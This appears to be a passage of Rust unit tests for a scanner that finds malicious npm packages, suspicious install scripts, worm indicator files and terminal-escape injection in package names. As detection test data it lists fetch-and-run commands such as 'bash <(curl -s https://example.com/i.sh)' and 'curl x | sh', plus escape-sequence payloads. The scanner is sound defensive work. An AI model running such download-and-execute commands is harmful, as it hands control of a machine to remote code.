            "bash <(curl -s https://example.com/i.sh)",
            "source <(curl -s https://example.com/i.sh)",
            "node -e \"$(curl -s https://example.com/i.js)\"",
            "$(curl -s https://example.com/cmd)",
            "`wget -qO- https://example.com/cmd`",
        ] {
            assert_eq!(
                script_suspicion(script),
                Some("directly executes a script it downloads"),
                "{script}"
            );
        }
    }

    #[test]
    fn npm_linked_store_is_scanned() {
        // `npm install --install-strategy=linked`: the package lives in
        // `node_modules/.store/<name>@<version>-<hash>/node_modules/<name>`
        // and `node_modules/<name>` is a link to it.
        let temp = TempDir::new("store");
        let stored = temp.package(
            "node_modules/.store/event-stream@3.3.6-u3FbOMqjxU0aYG6HeAmwRw/node_modules/event-stream",
            pkg("event-stream", "3.3.6"),
        );
        // Scoped packages sit one level deeper in npm's store.
        temp.package(
            "node_modules/.store/@pkgr/core@0.2.8-gQ81yrTZYqRCqGenfQe2EA/node_modules/@pkgr/core",
            pkg("@pkgr/core", "0.2.8"),
        );
        std::os::unix::fs::symlink(&stored, temp.0.join("node_modules/event-stream")).unwrap();

        let scan = scan(&[temp.0.join("node_modules")]);
        let found: Vec<&str> = scan.malware().map(|finding| finding.package.as_str()).collect();
        assert_eq!(found, ["@pkgr/core", "event-stream"]);
        assert_eq!(scan.packages, 2, "the link in place is not counted again");
    }

    #[test]
    fn scan_finds_nested_and_scoped_packages() {
        let temp = TempDir::new("nested");
        temp.package("node_modules/express", pkg("express", "4.18.2"));
        // A malicious version nested under another package.
        temp.package("node_modules/express/node_modules/debug", pkg("debug", "4.4.2"));
        temp.package("node_modules/@ctrl/tinycolor", pkg("@ctrl/tinycolor", "4.1.1"));
        temp.package(
            "node_modules/.pnpm/chalk@5.6.1/node_modules/chalk",
            pkg("chalk", "5.6.1"),
        );
        temp.package("node_modules/.bin/ignored", pkg("event-stream", "3.3.6"));

        let scan = scan(&[temp.0.join("node_modules")]);
        let found: Vec<&str> = scan.malware().map(|finding| finding.package.as_str()).collect();

        assert_eq!(scan.packages, 4);
        assert_eq!(found, ["@ctrl/tinycolor", "chalk", "debug"]);
        assert_eq!(scan.suspicious().count(), 0);
    }

    #[test]
    fn same_finding_is_collapsed_into_one_row() {
        let temp = TempDir::new("dedup");
        for project in ["a", "b", "c", "d"] {
            temp.package(&format!("{project}/node_modules/debug"), pkg("debug", "4.4.2"));
        }

        let scan = scan(&roots_under(&temp.0));
        assert_eq!(scan.roots.len(), 4);
        assert_eq!(scan.findings.len(), 1);
        assert_eq!(scan.findings[0].count, 4);
        assert_eq!(scan.findings[0].paths.len(), MAX_PATHS);
        assert_eq!(scan.installed.len(), 1);
    }

    #[test]
    fn ioc_file_and_script_findings() {
        let temp = TempDir::new("ioc");
        let worm = temp.package(
            "node_modules/innocent",
            serde_json::json!({
                "name": "innocent",
                "version": "1.0.0",
                "scripts": { "preinstall": "node setup_bun.js", "test": "curl x | sh" },
            }),
        );
        std::fs::write(worm.join("setup_bun.js"), "").unwrap();

        let scan = scan(&[temp.0.join("node_modules")]);
        let kinds: Vec<Kind> = scan.findings.iter().map(|finding| finding.kind).collect();
        // The `test` script does not run on install; only `preinstall` counts.
        assert_eq!(kinds, [Kind::IocFile, Kind::Script]);
    }

    #[test]
    fn skips_broken_and_unnamed_manifests() {
        let temp = TempDir::new("broken");
        let broken = temp.0.join("node_modules/broken");
        std::fs::create_dir_all(&broken).unwrap();
        std::fs::write(broken.join("package.json"), "{ broken").unwrap();
        temp.package("node_modules/helper", serde_json::json!({ "type": "module" }));

        let scan = scan(&[temp.0.join("node_modules"), temp.0.join("missing")]);
        assert_eq!(scan.packages, 0);
        assert!(scan.findings.is_empty());
    }

    #[test]
    fn oversized_manifest_is_reported_as_not_checked() {
        // Padding a manifest past the size limit must not hide the package.
        let temp = TempDir::new("oversized");
        let padding = "a".repeat(MAX_MANIFEST_BYTES as usize + 1);
        let padded = |name: &str| serde_json::json!({ "name": name, "version": "3.3.6", "description": padding });
        temp.package("node_modules/event-stream", padded("event-stream"));
        temp.package("node_modules/@scope/tool", padded("@scope/tool"));
        temp.package("node_modules/left-pad", pkg("left-pad", "1.3.0"));
        // No manifest, or one that is not a readable text file: still skipped
        // quietly, as before (npm cannot install such a package).
        std::fs::create_dir_all(temp.0.join("node_modules/no-manifest")).unwrap();
        std::fs::create_dir_all(temp.0.join("node_modules/odd/package.json")).unwrap();
        std::fs::create_dir_all(temp.0.join("node_modules/latin1")).unwrap();
        std::fs::write(
            temp.0.join("node_modules/latin1/package.json"),
            b"{\"name\":\"caf\xe9\"}",
        )
        .unwrap();

        let scan = scan(&[temp.0.join("node_modules")]);
        assert_eq!(scan.packages, 1, "only left-pad could be read");
        assert_eq!(scan.malware().count(), 0, "not checked is not malware");
        let unread: Vec<(&str, &str)> = scan
            .suspicious()
            .map(|finding| (finding.package.as_str(), finding.version.as_str()))
            .collect();
        assert_eq!(unread, [("@scope/tool", ""), ("event-stream", "")]);
        let finding = &scan.findings[0];
        assert_eq!(finding.kind, Kind::Unread);
        assert_eq!(
            finding.reason,
            "package.json is 3 MB, over the 2 MB this scan reads; check the package by hand"
        );
        assert!(
            NpmReport::new(String::new(), false, scan)
                .to_text()
                .contains("[NOT CHECKED]")
        );
    }

    #[test]
    fn manifest_with_a_bom_is_scanned() {
        // npm and Node accept a package.json that starts with a UTF-8 BOM.
        let temp = TempDir::new("bom");
        let dir = temp.0.join("node_modules/event-stream");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("package.json"),
            format!("\u{feff}{}", pkg("event-stream", "3.3.6")),
        )
        .unwrap();

        let scan = scan(&[temp.0.join("node_modules")]);
        assert_eq!(scan.packages, 1);
        let found: Vec<&str> = scan.malware().map(|finding| finding.package.as_str()).collect();
        assert_eq!(found, ["event-stream"]);
    }

    #[test]
    fn text_report_does_not_pass_control_characters_to_the_terminal() {
        let scan = Scan {
            findings: vec![Finding {
                kind: Kind::Script,
                package: "evil\u{1b}[1A\u{1b}[2K".into(),
                version: "1.0.0\u{1b}]0;PWNED\u{7}".into(),
                reason: "postinstall: directly executes a script it downloads".into(),
                count: 1,
                paths: vec![PathBuf::from("/x/node_modules/bundled\u{1b}[2K")],
            }],
            ..Scan::default()
        };
        let text = NpmReport::new(String::new(), false, scan).to_text();

        assert!(!text.contains("\u{1b}[2K") && !text.contains("\u{1b}]0;") && !text.contains('\u{7}'));
        assert!(text.contains("evil\\u{1b}[1A\\u{1b}[2K@1.0.0\\u{1b}]0;PWNED\\u{7}"));
        assert!(text.contains("bundled\\u{1b}[2K"));
    }

    #[test]
    fn text_report_marks_an_unknown_version() {
        let scan = Scan {
            findings: vec![Finding {
                kind: Kind::Script,
                package: "no-version".into(),
                version: String::new(),
                reason: "postinstall: directly executes a script it downloads".into(),
                count: 1,
                paths: vec![PathBuf::from("/x/node_modules/no-version")],
            }],
            ..Scan::default()
        };
        let text = NpmReport::new(String::new(), false, scan).to_text();
        assert!(text.contains("no-version@?"), "{text}");
    }

    #[test]
    fn text_report_counts_unread_packages_apart_from_scripts() {
        let scan = Scan {
            findings: vec![Finding {
                kind: Kind::Unread,
                package: "event-stream".into(),
                version: String::new(),
                reason: "package.json is 3 MB, over the 2 MB this scan reads; check the package by hand".into(),
                count: 1,
                paths: vec![PathBuf::from("/x/node_modules/event-stream")],
            }],
            ..Scan::default()
        };
        colored::control::set_override(false);
        let text = NpmReport::new(String::new(), false, scan).to_text();
        assert!(
            text.contains("1 packages not checked: Its package.json is too large to read"),
            "{text}"
        );
        assert!(!text.contains("suspicious install scripts"), "{text}");
        assert!(Kind::Script.advice().starts_with("Heuristic warning"));
        assert!(Kind::Known.advice().starts_with("Remove the package"));
    }

    #[test]
    fn project_search_skips_hidden_dirs_and_nested_node_modules() {
        let temp = TempDir::new("walk");
        temp.package("app/node_modules/a/node_modules/b", pkg("b", "1.0.0"));
        temp.package(".cache/node_modules/c", pkg("c", "1.0.0"));
        temp.package("Library/x/node_modules/d", pkg("d", "1.0.0"));

        let found = find_node_modules(&temp.0, &["Library"]);
        assert_eq!(found, [temp.0.join("app/node_modules")]);

        // If the path itself is a node_modules it is used as is.
        let direct = temp.0.join("app/node_modules");
        assert_eq!(roots_under(&direct), std::slice::from_ref(&direct));
    }

    #[test]
    fn a_silent_npm_is_reported_but_a_missing_one_is_not() {
        use crate::runner::MockRunner;
        const ROOT: &str = "npm root -g";

        let failed = MockRunner::new().fail(ROOT, "npm ERR! config prefix is broken\nmore");
        assert_eq!(
            global_roots_checked(&failed).1.as_deref(),
            Some("`npm root -g` failed: npm ERR! config prefix is broken")
        );

        let timed_out = MockRunner::new().error(ROOT, "`npm` did not finish within 20 seconds");
        assert!(global_roots_checked(&timed_out).1.is_some());

        let missing = MockRunner::new().error(ROOT, "could not run `npm`: No such file or directory (os error 2)");
        assert_eq!(global_roots_checked(&missing).1, None, "no npm, nothing to report");

        let fine = MockRunner::new().ok(ROOT, "/nonexistent/lib/node_modules");
        assert_eq!(global_roots_checked(&fine).1, None);
    }

    #[test]
    fn pattern_expansion() {
        let temp = TempDir::new("expand");
        std::fs::create_dir_all(temp.0.join("node/v20/lib")).unwrap();
        std::fs::create_dir_all(temp.0.join("node/v22/lib")).unwrap();

        let paths = expand(&temp.0, "node/*/lib");
        assert_eq!(paths, [temp.0.join("node/v20/lib"), temp.0.join("node/v22/lib")]);
        assert!(expand(&temp.0, "missing/*/lib").is_empty());
    }

    #[test]
    fn osv_response_keeps_only_mal_records() {
        let a = ("clean".to_string(), "1.0.0".to_string());
        let b = ("malicious".to_string(), "2.0.0".to_string());
        let c = ("vulnerable".to_string(), "3.0.0".to_string());
        let packages = [&a, &b, &c];

        let vuln = |id: &str| osv::Vuln {
            id: id.to_string(),
            modified: "x".to_string(),
        };
        let results = vec![
            vec![],
            vec![vuln("GHSA-xxxx"), vuln("MAL-2025-1")],
            vec![vuln("GHSA-yyyy")],
        ];
        assert_eq!(
            malware_hits(&packages, results),
            [OsvHit {
                package: "malicious".into(),
                version: "2.0.0".into(),
                ids: vec!["MAL-2025-1".into()],
            }]
        );
    }

    #[test]
    fn osv_finding_does_not_duplicate_embedded_list() {
        let temp = TempDir::new("osv");
        temp.package("node_modules/debug", pkg("debug", "4.4.2"));
        let mut scan = scan(&[temp.0.join("node_modules")]);

        let hit = |package: &str| OsvHit {
            package: package.into(),
            version: "4.4.2".into(),
            ids: vec!["MAL-1".into()],
        };
        scan.add_osv(vec![hit("debug"), hit("new-malicious")]);

        let kinds: Vec<(Kind, &str)> = scan
            .findings
            .iter()
            .map(|finding| (finding.kind, finding.package.as_str()))
            .collect();
        assert_eq!(kinds, [(Kind::Known, "debug"), (Kind::Osv, "new-malicious")]);
    }
}
